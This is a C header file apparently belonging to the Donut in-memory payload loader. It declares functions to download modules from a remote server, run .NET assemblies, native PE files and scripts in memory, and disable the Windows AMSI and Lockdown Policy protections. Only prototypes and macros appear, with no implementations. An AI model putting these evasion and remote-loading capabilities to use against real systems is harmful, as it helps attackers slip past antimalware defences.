/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#ifndef LOADER_H
#define LOADER_H

#if !defined(_MSC_VER)
#define __out_ecount_full(x)
#define __out_ecount_full_opt(x)
#include <inttypes.h>
#endif

#include <windows.h>
#include <wincrypt.h>
#include <oleauto.h>
#include <objbase.h>
#include <wininet.h>
#include <shlwapi.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")

#if defined(DEBUG)
#include <stdio.h>
#include <string.h>

#define __FILENAME__ (strrchr(__FILE__, '\\') ? strrchr(__FILE__, '\\') + 1 : __FILE__)

 #define DPRINT(...) { \
   fprintf(stderr, "\nDEBUG: %s:%d:%s(): ", __FILENAME__, __LINE__, __FUNCTION__); \
   fprintf(stderr, __VA_ARGS__); \
 }
#else
 #define DPRINT(...) // Don't do anything in release builds
#endif

#define STATIC_KEY ((__TIME__[7] - '0') * 1    + (__TIME__[6] - '0') * 10  + \
                    (__TIME__[4] - '0') * 60   + (__TIME__[3] - '0') * 600 + \
                    (__TIME__[1] - '0') * 3600 + (__TIME__[0] - '0') * 36000)

// Relative Virtual Address to Virtual Address
#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

#if defined(_M_IX86) || defined(__i386__)
// return pointer to code in memory
char *get_pc(void);

// PC-relative addressing for x86 code. Similar to RVA2VA except using functions in payload
#define ADR(type, addr) (type)(get_pc() - ((ULONG_PTR)&get_pc - (ULONG_PTR)addr))
#else
#define ADR(type, addr) (type)(addr) // do nothing on 64-bit
#endif

void *Memset(void *ptr, int value, size_t num);
void *Memcpy(void *destination, const void *source, size_t num);
int Memcmp(const void *ptr1, const void *ptr2, size_t num);

#if !defined(_MSC_VER)
#define memcmp(x,y,z) Memcmp(x,y,z)
#endif

#include "peb.h"           // Process Environment Block
#include "winapi.h"        // Prototypes
#include "clr.h"           // Common Language Runtime Interface

#include "donut.h"

#include "amsi.h"              // Anti-malware Scan Interface 
#include "activescript.h"      // Interfaces for executing VBS/JS files
#include "wscript.h"           // Interfaces to support WScript object

typedef struct {
    IActiveScriptSite			  site;
    IActiveScriptSiteWindow siteWnd;
    IHost                   wscript;
    PDONUT_INSTANCE         inst;      //  
} MyIActiveScriptSite;

// internal structure
typedef struct _DONUT_ASSEMBLY {
    ICLRMetaHost    *icmh;
    ICLRRuntimeInfo *icri;
    ICorRuntimeHost *icrh;
    IUnknown        *iu;
    AppDomain       *ad;
    Assembly        *as;
    Type            *type;
    MethodInfo      *mi;
} DONUT_ASSEMBLY, *PDONUT_ASSEMBLY;

    // Downloads a module from remote HTTP server into memory
    BOOL DownloadModule(PDONUT_INSTANCE);
    
    // .NET DLL/EXE
    BOOL LoadAssembly(PDONUT_INSTANCE, PDONUT_ASSEMBLY);
    BOOL RunAssembly(PDONUT_INSTANCE,  PDONUT_ASSEMBLY);
    VOID FreeAssembly(PDONUT_INSTANCE, PDONUT_ASSEMBLY);

    // In-Memory execution of native DLL
    VOID RunPE(PDONUT_INSTANCE);
    
    // VBS / JS files
    VOID RunScript(PDONUT_INSTANCE);

    // Disables Antimalware Scan Interface
    BOOL DisableAMSI(PDONUT_INSTANCE);
    
    // Disables Windows Lockdown Policy
    BOOL DisableWLDP(PDONUT_INSTANCE);
    
    LPVOID xGetProcAddress(PDONUT_INSTANCE, ULONGLONG, ULONGLONG);

#endif
